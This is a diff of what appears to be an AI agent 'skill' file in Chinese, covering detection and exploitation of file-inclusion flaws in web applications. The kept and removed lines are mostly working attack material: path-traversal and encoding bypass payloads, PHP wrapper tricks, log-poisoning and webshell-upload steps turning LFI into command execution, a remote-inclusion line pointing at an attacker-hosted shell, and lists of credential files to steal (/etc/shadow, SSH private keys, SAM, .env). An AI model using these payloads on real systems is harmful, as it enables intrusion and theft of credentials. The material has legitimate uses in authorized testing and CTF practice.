@@ -1,9 +1,3 @@
----
-name: file-inclusion
-description: 文件包含漏洞检测与利用。当目标存在文件读取、页面包含、模板加载、语言切换功能时使用。包括 LFI、RFI、路径遍历。
-allowed-tools: Bash, Read, Write
----
-
 # 文件包含 (File Inclusion)
 
 通过操纵文件路径参数，读取服务器敏感文件或执行恶意代码。
@@ -146,17 +140,13 @@ curl "http://target.com/page?file=/var/log/apache2/access.log&cmd=id"
 /var/log/httpd/access_log
 /var/log/httpd/error_log
 /var/log/auth.log
-/var/log/mail.log
-/var/log/vsftpd.log
 /proc/self/fd/1
 ```
 
 ### Session 文件包含
 
 ```bash
-# 1. 污染 session
-# 在用户名等字段注入 PHP 代码
-
+# 1. 污染 session（在用户名等字段注入 PHP 代码）
 # 2. 包含 session 文件
 /tmp/sess_<PHPSESSID>
 /var/lib/php/sessions/sess_<PHPSESSID>
@@ -191,8 +181,8 @@ C:\Windows\Temp\sess_<PHPSESSID>
 
 ```bash
 # 双写绕过
-....//....//....//etc/passwd
-..../\..../\..../\etc/passwd
+....//
+..../\
 
 # URL 编码
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
@@ -200,12 +190,10 @@ C:\Windows\Temp\sess_<PHPSESSID>
 
 # Unicode 编码
 ..%c0%af..%c0%af..%c0%afetc/passwd
-..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
 
 # 空字节截断 (PHP < 5.3.4)
 ../../../etc/passwd%00
 ../../../etc/passwd%00.php
-../../../etc/passwd%00.jpg
 ```
 
 ### 后缀绕过
@@ -229,12 +217,11 @@ C:\Windows\Temp\sess_<PHPSESSID>
 ```bash
 # ../ 被过滤
 ....//
-..../\
+....\
 ....\/
 %2e%2e%2f
 %2e%2e/
 ..%2f
-%2e%2e%5c
 
 # etc/passwd 被过滤
 /etc/./passwd
@@ -263,7 +250,6 @@ pHp://filter/convert.base64-encode/resource=index.php
 ```
 /etc/passwd
 /etc/shadow
-/etc/group
 /etc/hosts
 /etc/hostname
 /etc/resolv.conf
@@ -271,18 +257,12 @@ pHp://filter/convert.base64-encode/resource=index.php
 /etc/ssh/sshd_config
 /etc/apache2/apache2.conf
 /etc/nginx/nginx.conf
-/etc/mysql/my.cnf
 /root/.bash_history
 /root/.ssh/id_rsa
 /root/.ssh/authorized_keys
-/home/user/.bash_history
-/home/user/.ssh/id_rsa
 /proc/version
-/proc/cmdline
 /proc/self/environ
 /var/log/auth.log
-/var/log/apache2/access.log
-/var/log/apache2/error.log
 ```
 
 ### Windows
@@ -291,14 +271,9 @@ pHp://filter/convert.base64-encode/resource=index.php
 C:\Windows\win.ini
 C:\Windows\System32\drivers\etc\hosts
 C:\Windows\System32\config\SAM
-C:\Windows\System32\config\SYSTEM
 C:\Windows\repair\SAM
-C:\Windows\repair\SYSTEM
 C:\inetpub\wwwroot\web.config
 C:\xampp\apache\conf\httpd.conf
-C:\xampp\mysql\bin\my.ini
-C:\xampp\php\php.ini
-C:\Users\Administrator\.ssh\id_rsa
 ```
 
 ### Web 应用
@@ -311,25 +286,20 @@ database.php
 db.php
 settings.php
 .htaccess
-.htpasswd
 wp-config.php
-configuration.php
 
 # Java
 WEB-INF/web.xml
 WEB-INF/classes/
-META-INF/MANIFEST.MF
 
 # Python
 settings.py
 config.py
-app.py
 requirements.txt
 
 # Node.js
 package.json
 .env
-config.json
 ```
 
 ## LFI to RCE
@@ -378,63 +348,4 @@ curl "http://target.com/page?file=/proc/self/environ&cmd=id"
 # 1. 上传包含 PHP 代码的图片
 # 2. 通过 LFI 包含上传的文件
 curl "http://target.com/page?file=../uploads/shell.jpg"
-```
-
-## 最佳实践
-
-1. 先测试基础路径遍历: `../../../etc/passwd`
-2. 尝试不同编码和绕过技术
-3. 测试 PHP 伪协议读取源码
-4. 尝试 LFI to RCE（日志污染、php://input）
-5. 检查是否支持 RFI
-6. 枚举敏感文件（配置文件、密钥、日志）
-7. 分析源码寻找更多漏洞
-
----
-
-## 来自 CTF 经验积累
-
-### LFI 检测
-**基本测试**:
-- `?page=../../../etc/passwd`
-- `?page=php://filter/read=convert.base64-encode/resource=index.php`
-
-**常见文件**:
-- `/etc/passwd`
-- `/var/www/html/index.php`
-- `/proc/self/environ`
-- `/proc/self/cmdline`
-
-### PHP封装器
-```
-php://filter/read=convert.base64-encode/resource=flag.php
-php://input
-data://text/plain,<?php phpinfo();?>
-```
-
-### 日志包含
-```
-/var/log/apache2/access.log
-/var/log/nginx/access.log
-/proc/self/environ
-```
-
-### 伪协议
-```php://filter/read=convert.base64-encode/resource=flag.php
-zip://uploads/file.zip%23test.php
-phar://uploads/file.phar/test.php
-```
-
-### RFI利用
-当 `allow_url_include = On`:
-```
-?file=http://yourserver/shell.txt
-```
-
-### 常见绕过
-```
-....//....//etc/passwd
-..././..././etc/passwd
-%2e%2e%2f%2e%2e%2fetc%2fpasswd  # URL编码
-/etc/passwd%00  # 截断
 ```
